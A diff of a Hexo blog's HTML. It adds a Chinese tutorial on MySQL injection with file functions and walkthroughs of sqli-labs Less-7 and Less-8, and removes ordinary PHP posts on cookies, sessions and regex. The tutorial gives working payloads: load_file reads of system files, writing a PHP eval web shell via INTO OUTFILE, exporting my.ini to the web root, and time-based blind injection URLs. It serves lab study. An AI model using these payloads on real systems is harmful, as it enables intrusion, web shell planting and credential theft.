+<li>A、必须有权限读取并且文件必须完全可读 and(selectcount(<em>)frommysql.user)&gt;0/</em> 如果结果返回正常,说明具有读写权限。 and(selectcount(<em>)frommysql.user)&gt;0/</em> 返回错误，应该是管理员给数据库帐户降权 </li>
+<li>B、欲读取文件必须在服务器上 </li>
+<li>C、必须指定文件完整的路径</li>
+<li>D、欲读取文件必须小于 max_allowed_packet 如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的 就是权限，在 windows 下，如果 NTFS 设置得当，是不能读取相关的文件的，当遇到只有 administrators 才能访问的文件，users就别想 load_file 出来。 在实际的注入中，我们有两个难点需要解决： 绝对物理路径 构造有效的畸形语句 （报错爆出绝对路径） 在很多 PHP 程序中，当提交一个错误的 Query，如果 display_errors=on，程序就会暴露 WEB 目录的绝对路径，只要知道路径，那么对于一个可以注入的 PHP 程序来说，整个服务 器的安全将受到严重的威胁。 常用路径： <a href="http://www.cnblogs.com/lcamry/p/5729087.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5729087.html</a><br>示例：Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92, 114,101,112,97,105,114,92,115,97,109))) 利用 hex()将文件内容导出来，尤其是 smb 文件时可以使用。<br>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) Explain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码<br>-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) Explain：“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”<br>-1 union select 1,1,1,load_file(c:\\boot.ini) Explain:路径里的/用 \\代替<h2 id="文件导入到数据库"><a href="#文件导入到数据库" class="headerlink" title="文件导入到数据库"></a>文件导入到数据库</h2>LOADDATAINFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必 须为一个文字字符串。<br>在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据 库的权限时，可以将系统文件利用 loaddatainfile 导入到数据库中。</li>
+</ul>
+<p>函数具体介绍：对于参数介绍这里就不过多的赘述了，可以参考 mysql 的文档。（提醒：参 考文档才是最佳的学习资料）<br>示例：loaddatainfile’/tmp/t0.txt’ignoreintotablet0charactersetgbkfieldsterminatedby’\t’ linesterminatedby’\n’<br><img src="/2019/02/26/mysql注入知识03导入导出相关操作及less7-less8/1.png" alt=""><br>将/tmp/t0.txt 导入到 t0表中，charactersetgbk 是字符集设置为 gbk，fieldsterminatedby 是 每一项数据之间的分隔符，linesterminatedby 是行的结尾符。<br>当错误代码是 2 的时候的时候，文件不存在，错误代码为 13 的时候是没有权限，可以考虑 /tmp等文件夹。<br>TIPS：我们从 mysql5.7 的文档看到添加了 loadxml 函数，是否依旧能够用来做注入还需要验 证。</p>
+<h2 id="导入到文件"><a href="#导入到文件" class="headerlink" title="导入到文件"></a>导入到文件</h2><p>SELECT…..INTOOUTFILE’file_name’<br>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有 FILE 权限，才能使用此语法。file_name 不能是一个已经存在的文件。<br>我们一般有两种利用形式：<br>第一种直接将 select 内容导入到文件中：<br>Mysql 注入—sqlilabs—lcamry<br>32<br>Selectversion()intooutfile“c:\\phpnow\\htdocs\\test.php”<br>此处将 version()替换成一句话，&lt;?php@eval($_post[“mima”])?&gt;也即<br>Select &lt;?php@eval($_post[“mima”])?&gt; intooutfile“c:\\phpnow\\htdocs\\test.php”<br>直接连接一句话就可以了，其实在 select 内容中不仅仅是可以上传一句话的，也可以上传很 多的内容。<br>第二种修改文件结尾：<br>Selectversion()Intooutfile“c:\\phpnow\\htdocs\\test.php”LINESTERMINATEDBY0x16 进制文 件<br>解释：通常是用‘\r\n’结尾，此处我们修改为自己想要的任何文件。同时可以用 FIELDS TERMINATED BY<br>16 进制可以为一句话或者其他任何的代码，可自行构造。在 sqlmap 中 os-shell 采取的就是 这样的方式，具体可参考 os-shell 分析文章： <a href="http://www.cnblogs.com/lcamry/p/5505110.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5505110.html</a><br>TIPS：<br>（1）可能在文件路径当中要注意转义，这个要看具体的环境<br>（2）上述我们提到了 load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语 句：<br>selectload_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)intooutfile ‘c:\\wamp\\www\\test.php’<br>可以利用该语句将服务器当中的内容导入到 web 服务器下的目录，这样就可以得到数据了。 上述 my.ini当中存在 password 项（不过默认被注释），当然会有很多的内容可以被导出来， 这个要平时积累。</p>
+<h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><p>在使用导入导出函数前，我们需要解决权限问题</p>
+<h2 id="关于导入导出的权限问题："><a href="#关于导入导出的权限问题：" class="headerlink" title="关于导入导出的权限问题："></a>关于导入导出的权限问题：</h2><p>高版本的MYSQL添加了一个新的特性secure_file_priv，该选项限制了mysql导出文件的权限<br>secure_file_priv选项<br>secure_file_priv </p>
+<p>　　1、限制mysqld 不允许导入 | 导出<br>　   　   –secure_file_prive=null</p>
+<p>　　2、限制mysqld 的导入 | 导出 只能发生在/tmp/目录下<br>　　　   –secure_file_priv=/tmp/</p>
+<p>　　3、不对mysqld 的导入 | 导出做限制<br>              –secure_file_priv= </p>
+<p>用以下命令查看secure_file_priv的值<br>show variables like ‘%secure%’<br><img src="/2019/02/26/mysql注入知识03导入导出相关操作及less7-less8/2.png" alt=""><br>此时发现没有权限<br>在my.ini文件[mysqld]的后面加上secure_file_priv=‘’，然后重启phpstudy即可<br><img src="/2019/02/26/mysql注入知识03导入导出相关操作及less7-less8/3.png" alt=""><br><img src="/2019/02/26/mysql注入知识03导入导出相关操作及less7-less8/4.png" alt=""><br>设置完成后，重新查看<br><img src="/2019/02/26/mysql注入知识03导入导出相关操作及less7-less8/5.png" alt=""><br>权限设置完成<br>测试：<br><img src="/2019/02/26/mysql注入知识03导入导出相关操作及less7-less8/6.png" alt=""><br>查看生成的new.text<br><img src="/2019/02/26/mysql注入知识03导入导出相关操作及less7-less8/7.png" alt=""></p>
+<h2 id="回到less7中"><a href="#回到less7中" class="headerlink" title="回到less7中"></a>回到less7中</h2><p>本关的标题是 dump into outfile,意思是本关我们利用文件导入的方式进行注入<br>回到源代码中去。重点放在对 id 参数的处理和 sql 语句上，从源代码中可以看 到$sql=”SELECT*FROMusersWHEREid=((‘$id’))LIMIT0,1”; 这里对 id 参数进行了 ‘))的处理。所以我们其实可以尝试’))or1=1–+进行注入<br>使用into outfile 进行注入<br><a href="http://127.0.0.1/sqli-labs-master/Less-7/?id=1%27))union%20select%20version(),user(),database()into%20outfile%20%22D:\\\\\php\\\\PHPTutorial\\\\WWW\\\\sqli-labs-master\\\\Less-7\\\\3.txt%22%23" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/Less-7/?id=1%27))union%20select%20version(),user(),database()into%20outfile%20%22D:\\\\\php\\\\PHPTutorial\\\\WWW\\\\sqli-labs-master\\\\Less-7\\\\3.txt%22%23</a></p>
+<p><img src="/2019/02/26/mysql注入知识03导入导出相关操作及less7-less8/8.png" alt=""><br>上图中显示 sql 出错了，但是没有关系，我们可以在文件中看到 3.txt 已经生成了。<br><img src="/2019/02/26/mysql注入知识03导入导出相关操作及less7-less8/9.png" alt=""><br>类似的我们就可以获取想要的信息，输出到文本中。注意导入的文件名不能事先存在</p>
+<h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>经过简单的测试，我们发现 ‘or1=1–+返回正常，那么我们就基本知道应该怎么使用了，参 考 less5.这里简单的进行一个示例： <a href="http://127.0.0.1/sqllib/Less-8/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-8/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</a><br><img src="/2019/02/26/mysql注入知识03导入导出相关操作及less7-less8/10.png" alt=""><br>这里用的延时注入，当然了我们使用布尔类型的注入也是可以的，那么和第五关有什么区别 呢？<br>第八关我们直接从源代码中可以看到<br><img src="/2019/02/26/mysql注入知识03导入导出相关操作及less7-less8/11.png" alt=""><br>这里将 mysql 报错的语句进行了注释，那么这一关报错注入就不行了</p>
+<p>其他的 payload 参考 less5 直接进行注入</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/22/http基础知识/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1575,965 +2370,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/15/PHP基础12-cookie与session/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/15/PHP基础12-cookie与session/" class="post-title-link" itemprop="url">PHP基础12-cookie与session</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Post created: 2019-02-15 22:10:33 / Updated at: 22:39:48" itemprop="dateCreated datePublished" datetime="2019-02-15T22:10:33+08:00">2019-02-15</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/PHP基础/" itemprop="url" rel="index"><span itemprop="name">PHP基础</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <center><strong style="font-size: 30px;">会话控制</strong></center>
-
-<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Cookie是用来将网站的资料记录在客户端的技术，这种技术让Web服务器能将一些资料，存放于客户端（用户的电脑）之中。 比如：当通过验证,成功登录网站后，在”网页一“的PHP脚本中，会把这个用户有关的信息，设置到客户端电脑的Cookie中，当再次访问同一个网站中的其他脚本时，就会自动携带Cookie中的数据一起访问，在服务器中的每个脚本中都可以接受Cookie中的数据，不需要每访问一个页面就重新输入一次登录者的信息。<br>Cookies最典型的应用是判定注册用户是否已经登录网站，用户可能会得到提示，是否在下一次进入此网站时保留用户信息以便简化登录手续，这些都是Cookies的功用。另一个重要应用场合是“购物车”之类处理。用户可能会在一段时间内在同一家网站的不同页面中选择不同的商品，这些信息都会写入Cookies，以便在最后付款时提取信息。</p>
-<h2 id="使用和禁用Cookie"><a href="#使用和禁用Cookie" class="headerlink" title="使用和禁用Cookie"></a>使用和禁用Cookie</h2><p>用户可以改变浏览器的设置，以使用或者禁用Cookies。<br>微软Internet Explorer<br>工具 &gt; Internet选项 &gt; 隐私页<br>调节滑块或者点击“高级”，进行设置.<br>Mozilla Firefox<br>工具&gt;选项&gt;隐私<br>（注： 在Linux版本中，是如下操作：编辑 &gt; 首选项 &gt; 隐私 ， 而Mac则是：Firefox &gt; 属性 &gt; 隐私）<br>查看源网页<br>查看源网页 [5]<br>设置Cookies选项<br>设定阻止/允许的各个域内Cookie<br>查看Cookies管理窗口，检查现存Cookie信息，选择删除或者阻止它们<br><img src="/2019/02/15/PHP基础12-cookie与session/1.png" alt=""><br><strong>由于用户可能会禁用cookie那么使用替代方案：URL参数</strong></p>
-<h2 id="Cookie操作："><a href="#Cookie操作：" class="headerlink" title="Cookie操作："></a>Cookie操作：</h2><p>1.向客户端电脑中设置Cookie<br>   setcookie ();<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(uniqid(rand(<span class="number">1000</span>,<span class="number">9999</span>)));<span class="comment">//设置cookie产生的随机数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>2.在服务器端上读取Cookie的内容<br>   $_COOKIE<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">var_dump($_COOKIE);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>3.将多维数组应用于Cookie中<br>   setcookie(“member[name]”,’孙胜利’);<br>   setcookie(“member[email]”,<a href="mailto:&#39;1205429372@qq.com" target="_blank" rel="noopener">&#39;1205429372@qq.com</a>‘);<br>一维数组：将所以cookie都直接保存在cookie数组下<br>使用二维数组，这样就能使多个cookie保存在cookie数组里的一个数组元素中<br><img src="/2019/02/15/PHP基础12-cookie与session/c1.png" alt=""><br>之所以还有上面的两个cookie是因为有效期还没过，我们删除之前的记录后：<br><img src="/2019/02/15/PHP基础12-cookie与session/c2.png" alt=""><br>4.删除Cookie<br>   setcookie(“member”,’’,time()-1);<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">foreach</span> ($_COOKIE[<span class="string">'member'</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</span><br><span class="line">    var_dump(setcookie(<span class="string">"member[&#123;$key&#125;]"</span>,<span class="string">''</span>,time()<span class="number">-3600</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>注意点：使用setcookie删除cookie的时候，需要与当初设置cookie时的参数一致</p>
-<h1 id="session"><a href="#session" class="headerlink" title="session"></a>session</h1><p>Session技术与Cookie相似，都是用来存储使用者的相关资料，但是最大的不同之处在于Cookie是将资料存储在客户端电脑中，而Session则是将数据存放于服务器上。把保存的资料比喻成超市里面的会员卡，Cookie技术就相当于需要用户自己保存会员卡，每次去超市必须要持有会员卡才能代表自己的身份，那么Session技术就相当于会员卡由超市方保存，每次来超市的时候只需要报出会员卡的卡号(我们可以称为Session ID,客户端的cookie中只需要保存Session ID)即可！</p>
-<h2 id="session操作"><a href="#session操作" class="headerlink" title="session操作"></a>session操作</h2><p>1.开启session<br>   session_start();//开启一个会话，或者返回已经存在的会话<br>2.使用session存储数据<br>   session_start();<br>   $_SESSION[‘username’]=’sunshengli’;<br>   $_SESSION[‘email’]<a href="mailto:=&#39;1205429372@qq.com" target="_blank" rel="noopener">=&#39;1205429372@qq.com</a>‘;<br>3.注销变量与销毁session<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">session_start();<span class="comment">//打开要销毁的会话！</span></span><br><span class="line">session_unset();<span class="comment">//Free all session variables   释放所有的会话变量</span></span><br><span class="line">session_destroy();<span class="comment">//销毁一个会话中的全部数据</span></span><br><span class="line">setcookie(session_name(),<span class="string">''</span>,time()<span class="number">-3600</span>,<span class="string">'/'</span>);<span class="comment">//销毁保存在客户端的卡号（session id）</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>注意：<br>如果此时我们不写第四个path参数即代码为：<br>setcookie(session_name(),’’,time()-3600)<br>此时我们查看session和cookie的销毁情况如下:<br><img src="/2019/02/15/PHP基础12-cookie与session/s1.png" alt=""><br>注意到cookie没有被删掉<br>原因：<br>PHP手册中setcookie里面的第四个参数：<br>path<br>Cookie 有效的服务器路径。 设置成 ‘/‘ 时，Cookie 对整个域名 domain 有效。 如果设置成 ‘/foo/‘， Cookie 仅仅对 domain 中 /foo/ 目录及其子目录有效（比如 /foo/bar/）。 默认值是设置 Cookie 时的当前目录。<br>而使用session时传的cookie位置是”/“<br><img src="/2019/02/15/PHP基础12-cookie与session/s2.png" alt=""><br>我们可以发现路径不一致，因此没有销毁对应的cookie<br>当我们设置好path参数后，成功删除客户端里的cookie<br><img src="/2019/02/15/PHP基础12-cookie与session/s3.png" alt=""><br>结论：<br>在销毁保存在客户端的时cookie时，要保证和当初设置的参数（path）一致。</p>
-<p>在新的php中想获取session时，要先使用session_start();返回已经存在的会话。否则获取不到session</p>
-<h1 id="cookie与session"><a href="#cookie与session" class="headerlink" title="cookie与session"></a>cookie与session</h1><p>1&gt;联系：Session在客户端也需要保存一个标识，所以就要借助Cookie,session是通过cookie来工作的session和cookie之间是通过$_COOKIE[‘PHPSESSID’]来联系的，通过$_COOKIE[‘PHPSESSID’]可以知道session的id，从而获取到其他的信息。<br>2&gt;区别：Cookie机制采用的是在客户端(浏览器)保持状态的方案，而session机制采用的是在服务器端保持状态的方案</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/14/PHP正则表达式（续）/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/14/PHP正则表达式（续）/" class="post-title-link" itemprop="url">PHP正则表达式（续）</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Post created: 2019-02-14 19:52:46 / Updated at: 23:46:42" itemprop="dateCreated datePublished" datetime="2019-02-14T19:52:46+08:00">2019-02-14</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/PHP正则表达式/" itemprop="url" rel="index"><span itemprop="name">PHP正则表达式</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="正则表达式匹配网页"><a href="#正则表达式匹配网页" class="headerlink" title="正则表达式匹配网页"></a>正则表达式匹配网页</h1><p>//正则匹配函数：preg_match   preg_match_all<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$str=<span class="string">&lt;&lt;&lt;yfstr</span></span><br><span class="line"><span class="string">    &lt;div id="mainNav" class="clearfix"&gt;</span></span><br><span class="line"><span class="string">        &lt;a href="index.php"&gt;首页&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;a href="category.php?id=3"&gt;GSM手机&lt;/a&gt;</span></span><br><span class="line"><span class="string">       &lt;a href="category.php?id=4"&gt;双模手机&lt;/a&gt;</span></span><br><span class="line"><span class="string">       &lt;a href="category.php?id=6"&gt;手机配件&lt;/a&gt;</span></span><br><span class="line"><span class="string">       &lt;a href="group_buy.php"&gt;团购</span></span><br><span class="line"><span class="string">       商品&lt;/a&gt;</span></span><br><span class="line"><span class="string">       &lt;a href="activity.php"&gt;优惠活动&lt;/a&gt;</span></span><br><span class="line"><span class="string">       &lt;a href="snatch.php"&gt;夺宝奇兵&lt;/a&gt;</span></span><br><span class="line"><span class="string">       &lt;a href="auction.php"&gt;拍卖活动&lt;/a&gt;</span></span><br><span class="line"><span class="string">       &lt;a href="exchange.php"&gt;积分商城&lt;/a&gt;</span></span><br><span class="line"><span class="string">       &lt;a href="message.php"&gt;留言板&lt;/a&gt;</span></span><br><span class="line"><span class="string">       &lt;a href="http://bbs.ecshop.com/"&gt;EC论坛&lt;/a&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">yfstr;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;table width='900' border='1'&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;th&gt;名称&lt;/th&gt;&lt;th&gt;URL地址&lt;/th&gt;&lt;th&gt;链接&lt;/th&gt;&lt;/tr&gt;"</span>;</span><br><span class="line"><span class="comment">//使用正则匹配</span></span><br><span class="line">preg_match_all(<span class="string">"/&lt;a href=\"(.*?)\".*?&gt;(.*?)&lt;\/a&gt;/s"</span>,$str,$a);</span><br><span class="line"><span class="keyword">foreach</span>($a[<span class="number">0</span>] <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;td&gt;&#123;$a[2][$k]&#125;&lt;/td&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;td&gt;&#123;$a[1][$k]&#125;&lt;/td&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;td&gt;&#123;$v&#125;&lt;/td&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/table&gt;"</span>;</span><br></pre></td></tr></table></figure></p>
-<p>注:使用&lt;&lt;&lt; 这个是php定界符<br>使用格式:<br>&lt;&lt;&lt;EOF<br>…<br>EOF;<br>使用定界符无需给双引号增加转义字符,可以参考如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str=”/&lt;div id=\<span class="string">"mainNav\" class=\"clearfix\"&gt;/”;</span></span><br></pre></td></tr></table></figure></p>
-<h1 id="正则的其他函数使用"><a href="#正则的其他函数使用" class="headerlink" title="正则的其他函数使用"></a>正则的其他函数使用</h1><p>//正则的其他函数使用：<br>//preg_quote – 转义正则表达式字符<br>//preg_split – 用正则表达式分割字符串<br>//preg_replace – 执行正则表达式的搜索和替换<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//1.preg_quote -- 转义正则表达式字符</span></span><br><span class="line"><span class="keyword">echo</span> preg_quote(<span class="string">"(abc)&#123;10&#125;"</span>,<span class="string">"'"</span>);<span class="comment">//在每个增则表达式语法的字符前增加一个反斜杠</span></span><br><span class="line"></span><br><span class="line">$s = <span class="string">"a&#123;4&#125;"</span>;</span><br><span class="line">preg_match(<span class="string">"/"</span>.preg_quote($s).<span class="string">"/"</span>,<span class="string">"werta&#123;4&#125;yu"</span>,$a);</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2. preg_split -- 用正则表达式分割字符串</span></span><br><span class="line">$s = <span class="string">"12,34:56;784;35,67:897:65"</span>;</span><br><span class="line">$list = preg_split(<span class="string">"/[,:;]/"</span>,$s);</span><br><span class="line">var_dump($list);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr/&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//3. preg_replace执行正则表达式的搜索和替换</span></span><br><span class="line"></span><br><span class="line">$s = <span class="string">"12,34:56;784;35,67:897:65"</span>;</span><br><span class="line"><span class="comment">//要求将上面的:,;都换成空格</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/[,;:]/"</span>,<span class="string">" "</span>,$s);</span><br><span class="line"></span><br><span class="line">$str = <span class="string">"&lt;ul style='color:red'&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;aaaaa&lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;bbbbb&lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;ddddd&lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;eeeee&lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;/ul&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将上面字串中所有li标签中都添加一个b标签。</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr/&gt;"</span>;</span><br><span class="line"><span class="comment">//echo preg_replace("/&lt;li&gt;(.*?)&lt;\/li&gt;/","&lt;li&gt;&lt;b&gt;\\1&lt;/b&gt;&lt;/li&gt;",$str);</span></span><br><span class="line"><span class="comment">//echo preg_replace("/&lt;li&gt;(.*?)&lt;\/li&gt;/","&lt;li&gt;&lt;b&gt;\$1&lt;/b&gt;&lt;/li&gt;",$str);</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/&lt;li&gt;(.*?)&lt;\/li&gt;/"</span>,<span class="string">'&lt;li&gt;&lt;b&gt;$1&lt;/b&gt;&lt;/li&gt;'</span>,$str);</span><br></pre></td></tr></table></figure></p>
